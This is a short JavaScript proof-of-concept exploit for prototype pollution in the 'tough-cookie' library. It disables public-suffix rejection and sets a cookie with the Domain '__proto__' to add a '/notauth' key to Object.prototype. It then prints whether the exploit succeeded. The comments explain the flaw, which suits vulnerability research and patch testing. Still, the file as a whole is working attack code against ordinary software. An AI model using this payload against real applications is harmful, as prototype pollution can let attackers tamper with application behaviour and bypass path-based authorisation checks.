
// Importing the Cookie and CookieJar classes from the 'tough-cookie' module.
import { Cookie, CookieJar } from 'tough-cookie';

// Creating a new CookieJar instance. The 'rejectPublicSuffixes' option is set to false,
// which may allow cookies to be set for certain domains that would otherwise be rejected.
const jar = new CookieJar(undefined, { rejectPublicSuffixes: false });

// Setting a cookie with a vulnerable domain '__proto__'. The '__proto__' property is special in JavaScript
// as it represents the prototype object of an object. In this case, we're trying to manipulate the prototype
// of global objects using the 'Domain' attribute of a cookie.
jar.setCookieSync('Slonser=polluted; Domain=__proto__; Path=/notauth', 'https://__proto__/admin');

// The vulnerability occurs when the '__proto__' domain is used as the cookie's domain. 
// This can lead to prototype pollution, a security vulnerability that allows attackers to modify
// the behavior of the application or tamper with objects in the prototype chain.

// Here, we check if the global object has been affected by the malicious cookie. If the cookie successfully
// polluted the prototype, the '/notauth' key will be added to the global object.
if ({}.hasOwnProperty('/notauth')) {
   console.log('EXPLOITED SUCCESSFULLY');  // This message indicates that the prototype was polluted.
} else {
   console.log('EXPLOIT FAILED');  // If the prototype remains unmodified, the exploit has failed.
}
